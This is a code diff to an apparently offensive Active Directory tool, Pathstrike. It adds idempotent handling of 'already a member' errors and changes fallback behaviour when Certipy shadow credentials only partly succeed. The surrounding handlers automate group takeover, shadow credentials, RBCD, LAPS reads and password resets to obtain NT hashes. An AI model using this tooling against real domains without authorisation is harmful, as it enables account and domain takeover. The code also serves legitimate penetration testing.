@@ -30,6 +30,31 @@ def _generate_password(length: int = 20) -> str:
     return "".join(secrets.choice(alphabet) for _ in range(length))
 
 
+# Error substrings that indicate "already a member / ACE already present" —
+# those are success states for idempotent re-runs, not failures.
+_ALREADY_MEMBER_PATTERNS = (
+    "entryalreadyexists",
+    "error_member_in_alias",
+    "already a member",
+    "already exists",
+    "already has",
+)
+
+
+def _is_already_member_error(error: str | None) -> bool:
+    """Return True if *error* indicates the principal is already a member.
+
+    bloodyAD returns non-zero when adding a group member / ACE that already
+    exists.  For chained exploitation and repeated runs, that's the
+    desired end state — not a failure.  We detect the common AD/LDAP error
+    patterns that mean "already there".
+    """
+    if not error:
+        return False
+    low = error.lower()
+    return any(p in low for p in _ALREADY_MEMBER_PATTERNS)
+
+
 # ======================================================================
 # GenericAll / GenericWrite
 # ======================================================================
@@ -92,7 +117,14 @@ class GenericAllHandler(BaseEdgeHandler):
                 self.logger.info("Adding %s to group %s", principal, target)
                 result = await bloody.add_to_group(self.config, auth_args, principal, target)
                 if not result["success"]:
-                    return False, f"Failed to add {principal} to {target}: {result.get('error', 'unknown')}", []
+                    err = result.get("error", "unknown")
+                    if _is_already_member_error(err):
+                        self.logger.info(
+                            "%s is already a member of %s — treating as success",
+                            principal, target,
+                        )
+                        return True, f"{principal} was already a member of {target}", []
+                    return False, f"Failed to add {principal} to {target}: {err}", []
                 return True, f"Added {principal} to group {target}", []
 
             # ----- Computer target: Shadow Creds → RBCD → LAPS → PwReset -----
@@ -217,11 +249,28 @@ class GenericAllHandler(BaseEdgeHandler):
                     f"(NT hash parse failed — authenticate manually)",
                     new_creds,
                 )
-            strategy_errors.append("Certipy shadow auto: succeeded but no hash/cert in output")
-        else:
-            err = result.get("error", "unknown")
-            strategy_errors.append(f"Certipy shadow auto: {err}")
-            self.logger.warning("Certipy shadow auto failed on %s: %s", target, err)
+            # Certipy's subprocess succeeded (rc=0) but our output parser
+            # couldn't extract an NT hash or PFX path.  DO NOT fall through
+            # to Strategy 2 (bloodyAD shadow creds) — certipy already wrote
+            # a KeyCredentialLink to AD; running bloodyAD would add a second
+            # one and muddy rollback.  Return a clear failure instead so the
+            # user can inspect certipy's default output directory.
+            self._successful_strategy = "certipy_shadow_auto_partial"
+            return (
+                False,
+                (
+                    f"Certipy shadow auto ran successfully on {target} but "
+                    f"Pathstrike could not extract an NT hash or PFX path "
+                    f"from its output.  Check ~/.certipy/ (or certipy's "
+                    f"default output directory) for the PFX and authenticate "
+                    f"manually, or run `pathstrike rollback` to clean up the "
+                    f"AD changes."
+                ),
+                [],
+            )
+        err = result.get("error", "unknown")
+        strategy_errors.append(f"Certipy shadow auto: {err}")
+        self.logger.warning("Certipy shadow auto failed on %s: %s", target, err)
 
         # -------- Strategy 2: bloodyAD shadow credentials -----------------
         self.logger.debug(
@@ -687,20 +736,37 @@ class WriteOwnerHandler(BaseEdgeHandler):
                 self.config, auth_args, principal, target,
             )
             if not result["success"]:
-                # Don't fail the whole step — ownership + GenericAll still
-                # useful on their own, and the user can add themselves
-                # manually.  Just flag it in the result message.
+                err = result.get("error", "unknown")
+                # Idempotency: if the principal is already a member (e.g. from
+                # a previous run of this step), AD returns an error but the
+                # desired end state is already in place.  Treat as success.
+                if _is_already_member_error(err):
+                    self.logger.info(
+                        "%s is already a member of %s — chained steps "
+                        "will work (idempotent)",
+                        principal, target,
+                    )
+                    return (
+                        True,
+                        (
+                            f"Took ownership of {target}, granted GenericAll, "
+                            f"and confirmed {principal} is a member (group "
+                            f"rights propagate)"
+                        ),
+                        [],
+                    )
+                # Real failure — flag but don't abort (ownership + GenericAll
+                # are still useful; the user can add membership manually).
                 self.logger.warning(
                     "Failed to add %s to %s after taking ownership: %s",
-                    principal, target, result.get("error", "unknown"),
+                    principal, target, err,
                 )
                 return (
                     True,
                     (
                         f"Took ownership of {target} and granted GenericAll to "
                         f"{principal}; could NOT add as member — subsequent "
-                        f"chained steps via this group may fail: "
-                        f"{result.get('error', 'unknown')}"
+                        f"chained steps via this group may fail: {err}"
                     ),
                     [],
                 )
